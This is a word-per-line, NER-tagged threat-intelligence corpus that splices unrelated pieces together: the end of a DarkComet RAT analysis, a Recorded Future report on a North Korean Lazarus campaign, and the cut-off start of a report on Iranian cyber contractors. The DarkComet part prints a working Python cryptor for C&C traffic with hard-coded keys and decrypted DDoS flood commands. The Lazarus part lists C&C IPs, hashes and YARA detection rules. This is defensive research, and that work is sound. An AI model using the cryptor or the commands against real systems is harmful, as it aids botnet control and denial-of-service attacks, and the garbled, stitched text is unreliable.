parameters
stored
in
various
resources
;
some
of
the
more
interesting
ones
are
as
follows
:

Resource
Name

FAKEMSG

GENCODE

MSGCORE

MSGTITLE

Encrypted
Data
6146B749A3CF9C9FE8CFAB2C
1100A768B3C7C0F8FCDFC907B6F9
1C41A66E91C4C1BDE9

Decrypted
Value
9fcLqd0Gu00j

I
small
a
RAT
!

DarkComet B_malware.backdoor


MUTEX

NETDATA
1C638B4887FFE980B0B9AE72B1EA40A3
6919E62BE39D94F6ACCFAB68D5ED4BD67BA333
192.168.100.75:1604 B_ip.unknown
6811E636E69E9AEFA5C6
1F55B176A69A9A
0123456789

Guest16

DC_MUTEX-F54S21D

Figure
21
.
Interesting
encrypted
resources
Of
particular
interest
is
the
encrypted
NETDATA
resource
,
which
holds
the
C&C
hostname
and
port
.

The
Resource
Hacker
tool
is
a
great
utility
for
viewing
and
extracting
the
various
DarkComet B_malware.backdoor
encrypted
parameters
:


Figure
22
.
Resource
Hacker
extracting
DarkComet B_malware.backdoor
resources

So
to
summarize
,
DarkComet B_malware.backdoor
uses
a
hard-coded
(
although
different
for
each
version
)
preliminary
key
string
,
such
as
#KCMDDC42F#-890
,
to
decrypt
its
sensitive
parameters
from
various
raw
resources
-
such
as
the
C&C
information
and
communications
password
stored
in
the
NETDATA
and
PWD
resources
,
respectively
.

It
then
appends
the
decrypted
comms
password
(
stored
in
the
PWD
resource
)
to
the
end
of
the
preliminary
crypto
key
string
to
form
the
final
key
,
#KCMDDC42F#-8900123456789
,
that
it
uses
for
securing
the
network
traffic
to
and
from
its
C&C
server
.

Putting
everything
together
into
a
complete
DarkComet B_malware.backdoor
crypto
module
yields
the
following
Python
script
:
#
DarkComet B_malware.backdoor
decryptor
/
encryptor
#
Copyright
(
c
)
2012
Arbor
Networks
import
sys
class
DarkCometCryptor(object)
:
def
__init__(self
,
key
)
:
self._len_key
=
len(key
)
self._key
=
[
ord(token)
for
token
in
key
]
def
decrypt(
self
,
src
)
:
#
Convert
ASCII
to
hex
representation
buf
=
[
int(
'
0x%s
'
%
src
[
k*2:k*2+2
]
,
16
)
for
k
in
range(len(src)//2)
]
self._cryption(buf)
return
'
'
.join(
[
chr(token)
for
token
in
buf
]
)
def
encrypt(
self
,
src
)
:
buf
=
[
ord
(
token
)
for
token
in
src
]


self._cryption(buf)
#
Convert
to
hex
codes
(
upper
case
)
return
'
'
.join
(
[
'
%02x
'
%
tok
for
tok
in
buf
]
)
.upper()
def
_cryption
(
self
,
src
)
:
#
Build
subst
table
stable
=
list(range(256))
accum
=
0
for
k
in
range(256)
:
accum
+=
stable[k]
accum
+=
self._key[k
%
self._len_key]
accum
&=
0xff
stable[k]
,
stable[accum]
=
stable[accum]
,
stable[k]
#
Apply
subst
table
accum
=
0
for
k
in
range(len(src))
:
elem_a_idx
=
self._LS_BYTE
(
k
+
1
)
accum
+=
stable[elem_a_idx]
elem_b_idx
=
self._LS_BYTE(accum)
stable[elem_b_idx]
,
stable[elem_a_idx]
=
\
stable[elem_a_idx]
,
stable[elem_b_idx]
swap_sum
=
self._LS_BYTE(stable[elem_b_idx]
+
stable[elem_a_idx]
)
src[k]
^=
self._LS_BYTE(stable[swap_sum]
)
@staticmethod
def
_LS_BYTE(value)
:
return
0xff
&
value
if
__name__
==
'
__main__
'
:
if
len(sys.argv)
!=
4
or
sys.argv[1]
not
in
(
'
-d
'
,
'
-e
'
)
:
print
'
usage
:
%s
[-d|-e]
SRC_TEXT
KEY
'
%
sys.argv[0]


sys.exit(1)
do_decrypt
=
bool(sys.argv[1]
==
'
-d
'
)
src
=
sys.argv[2]
key
=
sys.argv[3]
print
'
%s
:
%s
'
%
(
'
CRYPT
'
if
do_decrypt
else
'
PLAIN
'
,
src
)
cryptor
=
DarkCometCryptor(key)
dst
=
cryptor.decrypt(src)
if
do_decrypt
else
cryptor.encrypt(src)
print
'
%s
:
%s
'
%
(
'
PLAIN
'
if
do_decrypt
else
'
CRYPT
'
,
dst
)

Applying
our
DarkComet B_malware.backdoor
encryption
module
against
the
observed
traffic
results
in
the
following
:

Figure
23
.
DarkComet.py  B_malware.backdoor
Crypto
Module

C&C
:

IDTYPE

Bot
:

SERVER

C&C
:

GetSIN
192.10.8.64 B_ip.cncsvr
|
27038511

Bot
:
infoesComet
|
192.10.8.64 B_ip.cncsvr
/
[192.1.167.30]  B_ip.cncsvr
:
1604|SANDBOX7
/

Admin|27038511|29s|Windows
XP
Service
Pack
2
[2600]
32
bit
(
C:\
)|x||US|C:\WINDOWS\system32\cmd.exe|{16382783-b70c-71e4-11e028f8efc0696f-10806d6172}|127.43
MiB/256.09
MiB
[128.22
MiB
Free]|English
(
United
States
)
US
/
--
|10/9/2011
at
8:13:31
PM

Figure
24
.
Decrypted
version
of
comms
from
Figure
2
.

Likewise
,
when
a
DarkComet B_malware.backdoor
C&C
issues
attacks
command
,
the
encrypted
traffic
on
the
wire
looks
like
these
examples
:
185CB63BBE0EA3DF6D2A725936265160E391BC77F47FF46A3934CFB173AC


185CB63BA31EA7C967297252432E5A7CFC96B261EB7EF4742533CEBF37A9C081
185CB63BA503B9C967297252432E5A7CFC96B261EB7EF4742533CEBF37A9C081

But
applying
the
decryption
routine
yields
the
following
:

DDOSHTTPFLOOD
192.168.100.254 B_ip.unknown
|
5

DDOSUDPFLOOD
192.168.100.254:80  B_ip.unknown
|
5

DDOSSYNFLOOD
192.168.100.254:80  B_ip.unknown
|
5

Which
corresponds
to
ordering
an
HTTP
flood
,
a
UDP
flood
,
and
a
TCP
flood
,
respectively
,
against
target
192.168.100.254 B_ip.unknown
,
with
each
attack
lasting
for
5
seconds
.

Once
the
attacks
are
completed
the
DarkComet B_malware.backdoor
bot
will
respond
with
an
encrypted
status
message
such
as
the
following
:
1E4CAB2DA50FBBDB781F5336347B073DA9DCD936B46EB03B646DDAE366F7D5C76D3C0420A55906F524
240A0F34D3A6384150

Which
decrypts
to
the
following
:

BTRESULTSyn
Flood
|
Syn
task
finished!
|
Administrator

As
implied
above
,
DarkComet B_malware.backdoor
supports
three
types
of
DDoS
attacks
:
HTTP
flooding
,
UDP
flooding
,
and
TCP
flooding
(
mis-advertised
as
'
SYNFLOOD
'
)
.

The
UDP
and
TCP
volumetric
floods
are
quite
unremarkable
and
simply
consist
of
random
gibberish
blasted
at
a
target
host
and
port
.

The
HTTP
flood
also
appears
to
be
intended
as
a
rudimentary
GET
flood
with
a
minimalist
HTTP
request
header
.

However
,
DarkComet's B_malware.backdoor
HTTP
flood
implementation
happens
to
have
not
one
,
but
two
catastrophic
bugs
.

First
of
all
,
the
thread
procedure
that
implements
the
DDOSHTTPFLOOD
attack
command
,
SendHttp_sub_485848()
,
uses
the
WinSock2
library's
socket()
,
connect()
,
and
send()
APIs
to
send
the
following
hard-coded
HTTP
flooding
request
:

GET
/
HTTP/1.1\r\n\r\n



At
first
glance
,
this
looks
like
an
(
almost
)
valid
,
although
minimalist
,
HTTP
request
that
is
terminated
with
a
double
carriage-return
/
line-feed
(
CRLF
)
combination
.

However
,
when
one
takes
a
closer
look
at
the
way
DarkComet B_malware.backdoor
stores
this
string
,
we
see
that
the
\r
and
\n
characters
are
not
actually
CR
(
0x0D
)
and
LF
(
0x0A
)
bytes
.

Instead
,
they
are
literally
comprised
of
the
backslash
(
0x2F
)
,
letter
r
(
0x72
)
,
and
letter
n
(
0x6E
)
bytes
!



Figure
25
.
Hard-coded
HTTP
request
string
HttpRequest_byte_485970

If
the
HTTP
request
string
had
been
encoded
properly
(
ending
with
0x0D0A0D0A
)
,
the
length
of
the
string
would
have
been
18
.

But
instead
,
we
see
that
it
is
22
bytes
in
length
.

Due
to
this
,
DarkComet's B_malware.backdoor
attempt
at
an
application
layer
attack
is
not
close
to
a
valid
HTTP
request
per
the
RFCs
.

The
second
big
mistake
in
the
implementation
of
DarkComet's B_malware.backdoor
HTTP
flood
attack
becomes
apparent
further
down
in
the
attack
thread
code
,
just
before
the
(
buggy
)
HTTP
request
payload
is
sent
to
the
target
via
the
send()
API
:



Figure
26
.
Function
EncryptAndSendData_sub_49393C()

Unbelievably
,
DarkComet B_malware.backdoor
bot
is
accidentally
encrypting
the
(
buggy
)
GET
request
string
at
instruction
0x00493972
via
a
call
to
the
already-reversed
Encrypt_sub_44C34C()
routine
.

The
resulting
(
encrypted
)
HTTP
request
is
then
sent
on
its
merry
way
to
the
DDoS
target
via
the
send()
API
call
at
instruction
0x0049399D
.

So
the
target
web
server
ends
up
receiving
gibberish
instead
of
a
well-formed
HTTP
request
that
might
exhaust
resources
at
the
application
layer
.

Due
to
these
two
serious
flaws
,
DarkComet's B_malware.backdoor
HTTP
flood
attack
reduces
down
to
nothing
more
than
a
volumetric
TCP
flood
against
port
80
,
and
a
very
weak
one
at
that
(
a
mere
22
bytes
of
TCP
payload
per
flooding
packet
...
)
In
fact
,
here
is
what
the
actual
'
HTTP
flooding
'
traffic
looks
like
:
1B5DAD48D97ABFDB7F3612275C26342091CED63D8620
1B5DAD48D97ABFDB7F3612275C26342091CED63D8620
1B5DAD48D97ABFDB7F3612275C26342091CED63D8620

Clearly
,
this
is
very
unlikely
to
bring
any
web
server
to
its
knees
!

Acknowledgements
to
Arbor
Networks
analyst
Curt
Wilson
for
his
valuable
insights
and
assistance
with
this
article
.
REPORT
North
Korea
Targeted
South
Korean
Cryptocurrency
Users
and
Exchange
in
Late
2017
Campaign
By
Juan
Andres
Guerrero-Saade
and
Priscilla
Moriuchi
Recorded
Future
CTA-2018-0116
CYBER
THREAT
ANALYSIS
North
Korea
Targeted
South
Korean
Cryptocurrency
Users
and
Exchange
in
Late
2017
Campaign
Executive
Summary
North
Korea
continued
to
target
South
Korea
through
late
2017
with
a
spear B_malware.infosteal
phishing I
campaign
against
both
cryptocurrency
users
and
exchanges
,
as
well
as
South
Korean
college
students
interested
in
foreign
affairs
.

The
malware
in
this
campaign
utilizes
a
known
Ghostscript
exploit
(
CVE-2017-8291 B_malware.infosteal
—
Intel
Card
)
and
is
tailored
to
target
only
users
of
a
Korean
language
word
processor
,
Hancom
's
Hangul
Word
Processor
.

Key
Judgments
●
North
Korean
government
actors
,
specifically
Lazarus
Group
(
Intel
Card
)
,
continued
to
target
South
Korean
cryptocurrency
exchanges
and
users
in
late
2017
,
before
Kim
Jong
Un
's
New
Year
's
speech
and
subsequent
North-South
dialogue
.

●
This
campaign
also
targeted
South
Korean
college
students
interested
in
foreign
affairs
and
part
of
a
group
called
'
Friends
of
MOFA
'
(
Ministry
of
Foreign
Affairs
)
.

●
The
malware
employed
shared
code
with
Destover B_malware.backdoor
malware
(
Intel
Card
)
,
which
was
used
against
Sony
Pictures
Entertainment
in
2014
and
the
first
WannaCry B_malware.ransom
victim
in
February
2017
.

●
The
dropper
in
this
campaign
exploited
a
known
Ghostscript
vulnerability
,
CVE-2017-8291 B_malware.infosteal
.

The
exploit
implementation
includes
Chinese
terms
possibly
signifying
an
attempted
false
flag
or
a
Chinese
exploit
supplier
.

Background
Recorded
Future
|
www.recordedfuture.com B_url.normal
|
CTA-2018-0116
|
1
CYBER
THREAT
ANALYSIS
North
Korean
state-sponsored
cyber
operations
are
largely
clustered
within
the
Lazarus
Group
(
Intel
Card
)
umbrella
.

Also
known
as
HIDDEN B_malware.infosteal
COBRA I
by
the
U.S.
government
,
Lazarus
Group
has
conducted
operations
since
at
least
2009
,
when
they
launched
a
DDoS
attack
on
U.S.
and
South
Korean
websites
utilizing
the
MYDOOM B_malware.backdoor
worm
.

Until
2015
,
Lazarus
Group
cyber
activities
primarily
focused
on
South
Korean
and
U.S.
governments
and
financial
organizations
,
including
destructive
attacks
on
South
Korean
banking
and
media
sectors
in
2013
and
the
highly
publicized
attack
on
Sony
Pictures
Entertainment
in
2014
.

Beginning
in
2016
,
researchers
discovered
a
shift
in
North
Korean
operations
toward
attacks
against
financial
institutions
designed
to
steal
money
and
generate
funds
for
the
Kim
regime
.

Lazarus
Group
in
Recorded
Future
.

Access
the
complete
Intel
Card
here
.

By
2017
,
North
Korean
actors
had
jumped
on
the
cryptocurrency
bandwagon
.

The
first
known
North
Korean
cryptocurrency
operation
occurred
in
February
2017
,
with
the
theft
of
$
7
million
(
at
the
time
)
in
cryptocurrency
from
South
Korean
exchange
Bithumb
.

By
the
end
of
2017
,
several
researchers
had
reported
additional
spear B_malware.infosteal
phishing I
campaigns
against
South
Korean
cryptocurrency
exchanges
,
numerous
successful
thefts
,
and
even
Bitcoin
and
Monero
mining
.

North
Korea
also
utilized
Bitcoin
for
the
global
WannaCry B_malware.ransom
ransomware
attack
in
mid-May
,
forcing
victims
to
pay
ransom
in
Bitcoin
.

Threat
Analysis
Insikt
Group
researchers
regularly
follow
North
Korean
threat
actors
through
a
variety
of
methods
,
one
of
which
includes
proactive
monitoring
of
attack
vectors
based
on
software
disproportionately
adopted
in
South
Korea
.

Using
this
methodology
,
we
identified
a
recent
Lazarus
Group
malware
campaign
,
which
likely
began
late
Fall
2017
.

Lazarus
Group
Recorded
Future
|
www.recordedfuture.com B_url.normal
|
CTA-2018-0116
|
2
CYBER
THREAT
ANALYSIS
operations
target
a
wide
swath
of
countries
and
verticals
,
with
a
particular
interest
in
South
Korean
targets
.

Recent
reporting
regarding
North
Korean
attacks
against
cryptocurrency
exchanges
and
using
Pyeongchang
Olympics
as
a
lure
describe
techniques
that
are
unusual
for
the
Lazarus
Group
.

These
include
leveraging
PowerShell
,
HTA
,
JavaScript
,
and
Python
,
none
of
which
are
common
in
Lazarus
operations
over
the
last
eight
years
.

The
campaign
we
discovered
showcases
a
clear
use
of
Lazarus
TTPs
to
target
cryptocurrency
exchanges
and
social
institutions
in
South
Korea
.

This
campaign
leveraged
four
different
lures
and
targeted
Korean-speaking
users
of
the
Hangul
Word
Processor
(
.hwp
file
extension
)
,
a
Korean-language
word
processing
program
utilized
widely
in
South
Korea
.

North
Korean
state-sponsored
actors
have
used
Hangul
exploits
(
CVE-2015-6585 B_malware.infosteal
)
and
malicious
.hwp
files
in
the
past
,
including
during
a
phishing
campaign
in
early
2017
,
to
target
South
Korean
users
.

Beyond
Korean-speaking
HWP
users
,
targets
of
this
campaign
appear
to
be
users
of
the
Coinlink
cryptocurrency
exchange
,
South
Korean
cryptocurrency
exchanges
at
large
(
or
at
least
those
that
are
hiring
)
,
and
a
group
called
'
Friends
of
MOFA
'
(
Ministry
of
Foreign
Affairs
)
,
which
is
a
group
of
college
students
from
around
South
Korea
with
'
a
keen
interest
in
foreign
affairs
.
'

Recorded
Future
|
www.recordedfuture.com B_url.normal
|
CTA-2018-0116
|
3
CYBER
THREAT
ANALYSIS
Payload
shows
two
prompts
from
coinlink.co.kr B_url.normal
,
the
first
tells
the
user
their
password
is
incorrect
,
the
second
asks
for
their
email
address
.

The
first
cryptocurrency-focused
lure
appears
designed
to
obtain
the
emails
and
passwords
of
users
of
Coinlink
,
a
cryptocurrency
exchange
run
by
the
South
Korean
electronic
stock
exchange
KOSDAQ
.

The
second
and
third
appear
to
be
resumes
stolen
from
two
actual
South
Korean
computer
scientists
,
both
with
work
experience
at
South
Korean
cryptocurrency
exchanges
.

The
fourth
document
was
lifted
from
a
blog
run
by
the
South
Korean
group
'
Friends
of
MOFA
'
detailing
a
Korean
Day
celebration
in
late
September
2017
during
which
President
Moon
Jae-in
spoke
about
the
importance
of
the
Korean
diaspora
and
the
upcoming
Winter
Olympics
in
Pyeongchang
.

Recorded
Future
|
www.recordedfuture.com B_url.normal
|
CTA-2018-0116
|
4
CYBER
THREAT
ANALYSIS
This
document
is
from
a
blog
post
from
the
'
Friends
of
MOFA
'
(
Ministry
of
Foreign
Affairs
)
detailing
a
Korean
Day
celebration
attended
by
President
Moon
Jae-in
.

1
Technical
Analysis
This
campaign
relies
on
a
known
Ghostscript
exploit
(
CVE-2017-8291 B_malware.infosteal
)
that
can
be
triggered
from
within
an
embedded
PostScript
in
a
Hangul
Word
Processor
document
.

1
Note
:
All
Korean
language
translations
provided
by
Gerald
Kim
.

Recorded
Future
|
www.recordedfuture.com B_url.normal
|
CTA-2018-0116
|
5
CYBER
THREAT
ANALYSIS
Timeline
of
CVE-2017-8291 B_malware.infosteal
exploitation
.

Screenshot
of
the
function
names
utilized
in
the
PostScript
.

Our
initial
finding
focused
on
'
로그인
오류.hwp
'
or
'
Korean
Day
'
lure
,
but
once
we
created
a
signature
for
the
particular
implementation
of
the
PostScript
,
we
found
three
additional
lure
documents
in
a
public
malware
repository
tied
together
by
the
use
of
this
exploit
:
two
CVs
and
a
cryptocurrency
exchange-themed
lure
.

All
were
created
in
the
span
of
a
month
from
mid-October
to
late
November
.

Despite
a
nearly
identical
delivery
mechanism
(
with
the
exception
of
altered
4-byte
XOR
keys
)
,
the
payloads
(
when
recoverable
)
were
different
in
each
case
.

Recorded
Future
|
www.recordedfuture.com B_url.normal
|
CTA-2018-0116
|
6
CYBER
THREAT
ANALYSIS
●
It
's
worth
noting
that
the
function
names
used
in
the
PostScript
are
transliterated
Chinese
words
.

While
'
yima
'
(
decode
)
and
'
yaoshi
'
(
key
)
appear
appropriate
in
their
functional
context
,
the
word
'
yinzi
'
(
factor
/
money
)
does
not
.

The
latter
may
be
obscure
technical
slang
or
be
a
misuse
signifying
a
potential
false
flag
.

This
would
not
be
the
first
time
the
Lazarus
Group
used
foreign-language
terms
to
misdirect
attribution
efforts
;
BAE
researchers
discovered
transliterated
Russian
terms
in
previous
Lazarus
operations
.

However
,
an
alternate
explanation
may
point
to
a
Chinese
exploit
supplier
or
the
language
competency
of
the
developer
.

The
attack
chain
occurs
in
multiple
stages
with
the
PostScript
deobfuscating
a
first
stage
shellcode
that
's
been
XORed
with
a
hardcoded
four-byte
key
.

The
shellcode
in
turn
triggers
the
GhostScript
vulnerability
in
order
to
execute
an
embedded
DLL
that
has
also
been
XORed
.

A
PwnCode.Club
blogpost
details
the
deobfuscation
of
the
shellcode
and
loading
of
the
DLL
into
memory
.

Lazarus
malware
families
(
like
Hangman B_malware.backdoor
(
Intel
Card
)
,
Duuzer B_malware.backdoor
(
Intel
Card
)
,
Volgmer B_malware.backdoor
(
Intel
Card
)
,
SpaSpe B_malware.backdoor
(
Intel
Card
)
,
etc
.
)

overlap
,
likely
as
the
result
of
the
developers
cutting-and-splicing
an
extensive
codebase
of
malicious
functionality
to
generate
payloads
as
needed
.

This
erratic
composition
make
the
Lazarus
intrusion
malware
difficult
to
identify
and
group
or
cluster
,
unless
they
are
analyzed
at
the
level
of
code
similarity
.

Upon
deobfuscating
the
payloads
,
we
found
32-bit
DLLs
built
in
part
on
the
Destover B_malware.backdoor
malware
(
Intel
Card
)
code
.

Destover B_malware.backdoor
has
been
used
in
a
number
of
North
Korea-attributed
operations
:
most
infamously
against
Sony
Pictures
Entertainment
in
2014
,
the
Polish
banking
attacks
in
January
2017
,
and
the
first
WannaCry B_malware.ransom
victim
in
February
2017
.

This
campaign
relies
on
multiple
payloads
fashioned
out
of
the
Destover B_malware.backdoor
infostealer
code
to
collect
information
about
the
victim
system
and
exfiltrate
files
.

Each
payload
contains
an
embedded
64-bit
version
of
itself
.

The
payloads
accompanying
the
newer
cryptocurrency
exchange-themed
lure
docs
compiled
a
month
after
the
Korean
Day
payload
further
obfuscate
their
functionality
by
resolving
imports
at
runtime
.

This
type
of
obfuscation
is
common
in
the
Lazarus
Hangman B_malware.backdoor
malware
family
.

They
also
rely
entirely
on
IPs
(
rather
than
domains
)
for
their
command-and-control
infrastructure
,
a
tactic
likely
borne
of
the
use
of
hacked
servers
for
infrastructure
.

Outlook
This
late
2017
campaign
is
a
continuation
of
North
Korea
's
interest
in
cryptocurrency
,
which
we
now
know
encompasses
a
broad
range
of
activities
including
mining
,
ransomware
,
and
Recorded
Future
|
www.recordedfuture.com B_url.normal
|
CTA-2018-0116
|
7
CYBER
THREAT
ANALYSIS
outright
theft
.

Outside
of
the
May
WannaCry B_malware.ransom
attack
,
the
majority
of
North
Korean
cryptocurrency
operations
have
targeted
South
Korean
users
and
exchanges
,
but
we
expect
this
trend
to
change
in
2018
.

We
assess
that
as
South
Korea
responds
to
these
attempted
thefts
by
increasing
security
(
and
possibly
banning
cryptocurrency
trading
)
they
will
become
harder
targets
,
forcing
North
Korean
actors
to
look
to
exchanges
and
users
in
other
countries
as
well
.

Further
,
while
this
campaign
and
toolset
are
specific
to
the
Hangul
Word
Processor
,
the
vulnerability
it
exploited
(
CVE-2017-8291 B_malware.infosteal
)
is
not
.

This
vulnerability
is
for
the
Ghostscript
suite
and
affects
a
wide
range
of
products
,
and
while
this
particular
version
is
triggered
from
within
an
embedded
PostScript
in
an
HWP
document
,
it
could
easily
be
adapted
to
other
software
.

As
South
Korean
exchanges
harden
their
networks
and
the
government
imposes
stricter
regulatory
controls
on
cryptocurrencies
,
exchanges
and
users
in
other
countries
should
be
aware
of
the
increased
threat
level
from
North
Korean
actors
.

Recorded
Future
|
www.recordedfuture.com B_url.normal
|
CTA-2018-0116
|
8
CYBER
THREAT
ANALYSIS
Appendix
A
Indicators
of
Compromise
Lures
MD5
da02193fc7f2a628770382d9b39fe8e0 B_hash
3d0d71fdedfd8945d78b64cdf0fb11ed B_hash
63069c9bcc4f8e16412ea1a25f3edf14 B_hash
8152e241b3f1fdb85d21bfcf2aa8ab1d B_hash
Payloads
46d1d1f6e396a1908471e8a8d8b38417 B_hash
6b061267c7ddeb160368128a933d38be B_hash
afa40517d264d1b03ac5c4d2fef8fc32 B_hash
c270eb96deaf27dd2598bc4e9afd99da B_hash
d897b4b8e729a408f64911524e8647db B_hash
e1cc2dcb40e729b2b61cf436d20d8ee5 B_hash
SHA256
3cfc7666c97c38f38a3b3ec1d132f2836ade7e6e6e3cddb30b0d7d81682de0b2 B_hash
3e9eab029c52ac34b91f906c8f92ad9059531f825905260023764f8a069edbbf B_hash
396a684949c96815b54c8e4c2fafbe6324d8c4dde2c9294411658fb5209cd70c B_hash
1cc7ad407fc87acb9c961105943c87a7bd77c4d4cc90b84b46fb5dcf779b50fd B_hash
3368b6060d181e39a57759ab9b7f01221e0cd3a397000977aa8bb07a0e6a94ca B_hash
ca70aa2f89bee0c22ebc18bd5569e542f09d3c4a060b094ec6abeeeb4768a143 B_hash
f94fb5028a81177bb5ea3428349da4d9b125f81adb658df40d6e8f3ea0e0e3e7 B_hash
cf065e50a5bef24099599af6a60a78c1607a04b21d3573a25ab26bf044a119d6 B_hash
5afa8329c0a159811b55c92303f0d0b9b8834843c76f51777593d414bda5191b B_hash
77cee0ccc739d3d420e95460c72f7ad2a9846f06e4a7089fb92b8fca4a52ce3f B_hash
Recorded
Future
|
www.recordedfuture.com B_url.normal
|
CTA-2018-0116
|
9
CYBER
THREAT
ANALYSIS
Command-and-Control
110.173.188.53:443 B_ip.cncsvr
70.60.36.183:443 B_ip.cncsvr
72.10.122.70:443 B_ip.cncsvr
112.160.75.159:5443 B_ip.cncsvr
125.142.192.81:443 B_ip.cncsvr
175.213.42.234:443 B_ip.cncsvr
Yara
Rules
rule
apt_NK_Lazarus_SKOlympics_EPS
{
meta
:
ascii
wide
}
condition
:
6
of
them
rule
apt_NK_Lazarus_Fall2017_payload_minCondition
{
meta
:
desc
=
'
Minimal
condition
set
to
detect
payloads
from
Fall
2017
Lazarus
Campaign
against
Cryptocurrency
Exchanges
and
Friends
of
MOFA
11
'
author
=
'
JAGS
,
Insikt
Group
,
Recorded
Future
'
version
=
'
2.0
'
Recorded
Future
|
www.recordedfuture.com B_url.normal
|
CTA-2018-0116
|
10
author
=
'
JAG-S
,
Insikt
Group
,
RF
'
desc
=
'
CN
terms
in
PostScript
loader
'
TLP
=
'
Green
'
version
=
'
1.0
'
md5
=
'
231fe349faa7342f33402c562f93a270 B_hash
'
strings
:
$
eps_strings1
=
'/yinzi
{
token
pop
exch
pop
}
bind
def
'
ascii
wide
$
eps_strings2
=
'/yaoshi
<
A3E6E7BB
>
def
'
ascii
wide
$
eps_strings8
=
/\/
yaoshi
<
[
A
-F0
-9
]
{
8
}
>
def/
ascii
wide
$
eps_strings3
=
'/yima
{
'
ascii
wide
$
eps_strings4
=
'/funcA
exch
def
'
ascii
wide
$
eps_strings5
=
'0
1
funcA
length
1
sub
{
'
ascii
wide
$
eps_strings6
=
'/funcB
exch
def
'
ascii
wide
$
eps_strings7
=
'funcA
funcB
2
copy
get
yaoshi
funcB
4
mod
get
xor
put
'
CYBER
THREAT
ANALYSIS
TLP
=
'Green
'
md5
=
'
46d1d1f6e396a1908471e8a8d8b38417 B_hash
'
md5
=
'
6b061267c7ddeb160368128a933d38be B_hash
'
md5
=
'
afa40517d264d1b03ac5c4d2fef8fc32 B_hash
'
md5
=
'
c270eb96deaf27dd2598bc4e9afd99da B_hash
'
md5
=
'
d897b4b8e729a408f64911524e8647db B_hash
'
md5
=
'
e1cc2dcb40e729b2b61cf436d20d8ee5 B_hash
'
strings
:
$
sub1800115A0
=
{
488
D542460488D8DB005000041FF9424882000004C8BE84883F8FF0F84EA010000488D8DC007000033D
241B800400000E8
}
$
sub18000A720
=
{
33
C0488BBC2498020000488B9C2490020000488B8D600100004833CCE8
}
condition
:
uint16
(
0
)
==
0x5A4D
and
filesize
<
5
MB
and
any
of
them
}
Recorded
Future
|
www.recordedfuture.com B_url.normal
|
CTA-2018-0116
|
11
CYBER
THREAT
ANALYSIS

Iran's
Hacker
Hierarchy
Exposed

How
the
Islamic
Republic
of
Iran
Uses
Contractors
and
Universities
to
Conduct
Cyber
Operations

By
Levi
Gundert
,
Sanil
Chohan
,
and
Greg
Lesnewich

Recorded
Future



Scope
Note
:
Insikt
Group
conducted
interviews
with
a
former
Iranian
hacker
with
first-hand
knowledge
of
the
information
shared
and
was
living
in
Iran
when
he
started
one
of
Iran's
first
security
forums
.

This
source's
commentary
forms
the
basis
for
the
background
on
the
genesis
of
Iran's
offensive
cyber
efforts
.

Additional
research
was
facilitated
with
Recorded
Future
and
by
leveraging
thirdparty
metadata
and
open
source
intelligence
(
OSINT
)
techniques
using
a
variety
of
tools
.

While
we
address
historical
background
and
precedent
in
the
piece
,
the
technical
analysis
regarding
organizations
and
institutes
in
Iran's
offensive
cyber
program
is
based
on
data
collected
from
March
1
,
2018
to
April
30
,
2018
.

Executive
Summary

Since
at
least
2009
,
the
Islamic
Republic
of
Iran
has
regularly
responded
to
sanctions
or
perceived
provocations
by
conducting
offensive
cyber
campaigns
.

The
Islamic
Republic
has
historically
preferred
to
use
proxies
or
front
organizations
both
in
physical
conflict
—
Hezbollah
against
Israel
and
Yemen
rebels
against
Saudi
Arabia
—
and
cyberattacks
to
achieve
their
policy
goals
.

Currently
,
Iran
faces
the
prospect
of
negative
economic
impact
via
renewed
sanctions
.

On
May
8
,
2018
President
Trump
announced
that
the
United
States
would
not
renew
the
waivers
on
sanctions
against
Iran
.

The
U.S
will
instead
impose
additional
economic
penalties
,
the
combination
of
which
amounts
to
a
de
facto
U.S.
withdrawal
from
the
2015
Joint
Comprehensive
Plan
of
Action
(
JCPOA
)
(
commonly
referred
to
as
the
'
Iran
nuclear
deal
'
.

We
assess
,
based
on
Iran's
previous
reactions
to
economic
pressure
,
that
with
President
Trump's
exit
from
the
JCPOA
,
Iran
is
likely
to
respond
by
launching
cyberattacks
on
Western
businesses
within
months
,
if
not
faster
.

Judging
from
historical
patterns
,
the
businesses
likely
to
be
at
greatest
risk
are
in
many
of
the
same
sectors
that
were
victimized
by
Iranian
cyberattacks
between
2012
and
2014
and
include
banks
and
financial
services
,
government
departments
,
critical
infrastructure
providers
,
and
oil
and
energy
.

Key
Judgments

The
Islamic
Republic
has
abandoned
its
typically
deliberate
and
methodical
approach
to
cyber
operations
on
only
two
known
occasions
,
in
2012
and
in
2014
,
when
a
quick
reactionary
response
was
required
.

We
assess
that
when
Iranian
cyber
operators
respond
to
the
U.S.
withdrawal
from
the
JCPOA
that
the
operations
will
be
staffed
and
executed
by
capable
,
but
less
trusted
contractors
.

Further
,
we
assess
that
staffing
these
operations
with
less
trusted
contractors
could
result
in
a
scenario
where
the
Islamic
Republic
has
difficulty
controlling
the
scope
and
scale
of
the
destructive
cyberattacks
once
they
have
begun
.



Iranian
cyber
operations
are
administered
via
a
tiered
approach
,
where
an
ideologically
and
politically
trusted
group
of
middle
managers
translate
intelligence
priorities
into
segmented
cyber
tasks
which
are
then
bid
out
to
multiple
contractors
.

This
creates
a
quasi-capitalistic
system
that
pits
contractors
against
each
other
for
influence
with
the
Iranian
government
.

The
Islamic
Republic
operates
with
embedded
paranoia
,
where
ultimately
,
no
one
can
be
trusted
.

The
situation
creates
unique
trade-offs
in
Iran's
government-sanctioned
offensive
cyber
campaigns
;
individuals
with
demonstrated
adherence
to
the
government's
ideology
and
individuals
with
the
greatest
offensive
cyber
skills
are
almost
always
mutually
exclusive
.

•
Based
on
our
source's
conversations
with
other
hackers
in
Iran
,
there
are
over
50
estimated
contractors
vying
for
Iranian
government-sponsored
offensive
cyber
projects
.

Only
the
best
individuals
or
teams
succeed
,
are
paid
,
and
remain
in
business
.

Insikt
Group
analyzed
internet
traffic
relating
to
various
institutes
affiliated
with
the
Iranian
cyber
ecosystem
from
March
1
,
2018
to
April
30
,
2018
.

As
this
is
the
first
profiling
of
Iranian
internet
activity
for
these
institutes
,
we
cannot
determine
whether
the
suspicious
activity
we
analyzed
was
in
preparation
of
the
U.S.
announcement
.

According
to
Insikt
Group's
source
,
to
find
and
retain
the
best
offensive
cyber
talent
,
Iranian
government
contractors
are
forced
to
mine
closed-trust
communities
.

The
links
between
the
forums
and
contractors
may
illustrate
that
the
trust
communities
begin
with
the
Iranian
security
forums
.

The
History
of
Iranian
Geopolitical
Response
and
the
Nuclear
Agreement
Decision

Editor's
Note
:
Where
applicable
,
information
in
this
section
was
provided
by
a
former
Iranian
hacker
with
direct
access
to
the
information
provided
.

Based
on
